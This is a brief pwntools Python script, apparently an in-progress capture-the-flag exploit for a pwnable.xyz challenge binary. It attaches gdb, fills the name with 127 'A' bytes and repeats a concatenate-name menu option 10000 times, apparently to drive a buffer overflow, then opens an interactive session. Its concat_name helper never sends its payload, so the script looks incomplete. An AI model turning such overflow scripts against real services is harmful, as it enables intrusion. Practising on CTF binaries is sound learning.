from pwn import *

elf = context.binary = ELF('challenge', checksec=False)

gdbscript = '''
break *0x400B0D
break *0x400B4B
c
'''

r = process(elf.path) #elf.path
#r = remote('svc.pwnable.xyz', 30011)  
#r = gdb.debug(elf.path, gdbscript=gdbscript)
pid, io_gdb = gdb.attach(r, api=True)

def init(option):
    r.recvuntil(b">")
    r.sendline(option)

def edit_disc(payload):      
    r.recvuntil(b"Desc:")
    r.sendline(payload)

def concat_name(payload):
    r.recvuntil("Name:")

r.recvuntil("Name:")
r.sendline("A"*127)


for i in range(10000):
    print("send")
    init(b'1')
    concat_name(b"A")

print("here")
init(b'2')
edit_disc("123")
# io_gdb.execute(gdbscript)
init(b'1')
concat_name(b"A")


r.interactive()
